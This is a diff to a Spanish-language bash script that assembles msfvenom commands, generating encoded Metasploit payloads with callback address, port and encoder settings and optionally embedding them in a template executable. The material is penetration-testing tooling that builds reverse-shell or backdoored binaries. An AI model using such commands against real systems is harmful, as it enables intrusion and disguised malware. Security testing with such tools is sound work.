@@ -830,7 +830,7 @@ read -rsp $'Pulse cualquier tecla para finalizar.\n' -n1 key
 
 # msfvenom -a ARCH -p PAYLOAD -f FORMAT -e ENCODER -i ITERATIONS -x TEMPLATE lhost=IP lport=PORT -k THREAD > ejecutable.extension
 
-ejecucion='msfvenom -a '$arquitectura' --platform '$sistema_objetivo' -e '$encoder' -i '$iteraciones' lhost='$LHOST' lport='$LPORT''
+ejecucion='msfvenom -a '$arquitectura' -p '$payload' -e '$encoder' -i '$iteraciones' lhost='$LHOST' lport='$LPORT''
 
 if (( $hilo == 1 )); then
 	ejecucion="$ejecucion -k "
